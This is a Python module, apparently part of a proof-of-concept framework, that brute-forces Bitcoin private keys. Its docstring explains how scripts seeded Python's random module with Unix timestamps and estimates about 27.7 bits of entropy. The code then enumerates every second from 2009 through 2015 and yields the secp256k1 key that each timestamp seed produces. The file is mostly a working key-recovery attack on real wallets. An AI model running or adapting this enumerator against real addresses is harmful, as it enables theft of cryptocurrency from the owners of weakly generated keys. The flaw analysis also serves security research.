"""
Python random module MT19937 time seed — private key enumerator

Vulnerability model:
    Amateur Bitcoin scripts use Python 2/3's random module to generate private keys:

    Method A (most common — explicit time seed):
        import random, time
        random.seed(int(time.time()))
        key = random.getrandbits(256)

    Method B (Python 2 default seed fallback):
        import random
        # Without /dev/urandom: seed(long(time.time() * 256))
        key = random.getrandbits(256)

    Method C (fixed seed — leftover test code):
        random.seed(0)  # or seed(1), seed(42), etc.

    In all cases MT19937 is a deterministic function:
        seed -> init_by_array(key_from_seed) -> getrandbits(256)
        Output is entirely determined by the seed.

    Note: CPython uses init_by_array for int seeds (not simple init_genrand),
    so this POC directly uses the Python stdlib random module to guarantee 100% equivalence.

Effective entropy analysis:
    - seed = int(time.time()): Unix timestamp, second precision
    - Time window 2009-01-03 (Bitcoin genesis) to 2015-12-31: ~220M seconds
    - Effective entropy: log2(220M) ~ 27.7 bit
    - Trivially enumerable: 220M seed+getrandbits iterations complete in minutes on modern CPU

Real-world scenarios:
    - Numerous "how to generate Bitcoin address in Python" tutorials and answers
      on StackOverflow / Bitcoin Talk used the random module
    - DIY scripts, student projects, hackathon code from 2011-2014
    - Early versions of pybitcointools random_key() had a random.randrange path
      (though later protected by os.urandom)

Mathematical proof:
    Let f(t) = getrandbits(256) after random.seed(t), t in Z
    Private key set K = { f(t) mod (n-1) + 1 | t in [T_start, T_end) }
    |K| <= T_end - T_start ~ 220,599,895
    H_eff = log2(|K|) ~ 27.7 bit << 128 bit
"""
import sys
import os
import random as stdlib_random
from typing import Iterator, Optional, Tuple

HERE = os.path.dirname(os.path.abspath(__file__))
from base import PocGenerator


SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141


def privkey_from_seed(seed: int) -> Optional[str]:
    """
    Given a timestamp seed, exactly reproduce random.seed(ts); random.getrandbits(256).
    Uses the Python stdlib directly to guarantee 100% equivalence with the target code.
    """
    stdlib_random.seed(seed)
    raw = stdlib_random.getrandbits(256)

    if raw == 0 or raw >= SECP256K1_N:
        return None

    return raw.to_bytes(32, 'big').hex()


# Time window: 2009-01-03 18:15:05 UTC (genesis) to 2016-01-01 00:00:00 UTC
GENESIS_TIMESTAMP = 1231006505
END_TIMESTAMP = 1451606400
TOTAL_SPACE = END_TIMESTAMP - GENESIS_TIMESTAMP  # 220,599,895 ~ 2^27.7


class Mt19937TimeSeedGenerator(PocGenerator):
    """
    Enumerate all Unix second-precision timestamps from 2009-2015 as random.seed() arguments,
    each deterministically producing one secp256k1 private key (hex).

    Simulated scenario: random.seed(int(time.time())); random.getrandbits(256)

    Effective entropy: ~27.7 bit (7-year time window, second precision)
    Risk level: critical (<=40 bit)
    """

    @property
    def poc_id(self) -> str:
        return "mt19937_time_seed"

    @property
    def poc_name(self) -> str:
        return "Python random.seed(time) MT19937 weak seed"

    @property
    def total_space(self) -> int:
        return TOTAL_SPACE

    @property
    def batch_size(self) -> int:
        return 10000

    def generate(self, start_index: int) -> Iterator[Tuple[int, Optional[str]]]:
        for idx in range(start_index, TOTAL_SPACE):
            timestamp = GENESIS_TIMESTAMP + idx
            privkey_hex = privkey_from_seed(timestamp)
            yield (idx, privkey_hex)
